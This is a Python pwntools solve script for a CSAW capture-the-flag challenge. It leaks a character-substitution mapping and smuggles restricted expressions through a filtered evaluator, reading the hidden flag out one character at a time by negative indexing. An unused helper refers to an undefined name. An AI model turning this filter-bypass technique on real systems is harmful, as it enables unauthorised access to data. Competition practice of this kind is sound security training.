from pwn import *

from encoder import encode_negative

# io = process(["python", "main.py"])
io = remote("chals.ctf.csaw.io", 21009)

# discover single quote
q = None
for letter in "abcdefghijklmnopqrstuvwxyz'":
    io.sendlineafter("> ", f"{letter}{letter}".encode("ascii"))
    out = io.readline().decode("l1").strip()
    if out == "":
        # found a quote
        q = letter
assert q
print("q:", q)

# leak mapping
x = "abcdefghijklmnopqrstuvwxyz".replace(q, "")
io.sendlineafter("> ", f"{q}{x}{q}".encode("ascii"))
y = io.readline().decode("l1").strip()
x += q
y += "'"
print(x)
print(y)
assert len(x) == len(y)
translation = str.maketrans(y, x)
spiral_translated = "spiral".translate(translation)
print(spiral_translated)
# check that spiral is decoded properly
io.sendlineafter("> ", f"{q}{spiral_translated}{q}".encode("ascii"))
t1 = io.readline().decode("l1").strip()
print("spiral:", t1)
assert t1 == "spiral"

allowed = "([<~abcdefghijklmnopqrstuvwxyz>+]/*')"


def send_command(command: str):
    assert len(command) < 150
    translated = command.translate(translation)
    print(translated)
    io.sendlineafter("> ", translated.encode("ascii"))
    out = io.readline().decode("l1").strip()
    return out


# debug loop
# while True:
#     print(send_command(input(">> ")))

zero = "([]>[[]])"
one = "([]<[[]])"
two = f"{one}+{one}"
negone = "~([]>[[]])"
negtwo = "~([]<[[]])"


def to_negative(num):
    return "+".join(num * [negative_one])


flag = ""
i = -1
try:
    while True:
        print(flag)
        flag_char = send_command(f"spiral[{encode_negative(i)}]")
        assert len(flag_char) == 1
        print("flag:", flag)
        i -= 1
        flag = flag_char + flag
        if flag.startswith("csawctf{"):
            break
except Exception as e:
    raise

print("final flag:", flag)

io.close()
